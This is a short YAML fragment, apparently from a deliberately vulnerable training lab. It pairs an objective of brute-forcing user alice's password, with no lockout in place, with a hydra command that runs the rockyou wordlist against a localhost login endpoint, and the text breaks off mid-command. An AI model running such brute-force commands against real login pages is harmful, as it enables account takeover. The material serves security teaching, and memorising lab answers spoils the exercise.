    objective: >-
      Brute-force alice's password with no lockout in place.
    exploit: |
      ```bash
      # Using hydra
      hydra -l alice -P /usr/share/wordlists/rockyou.txt \
        localhost http-post-form \
        "/api/a07/auth/login:username=^USER^&password=^PASS^:Invalid credentials" \
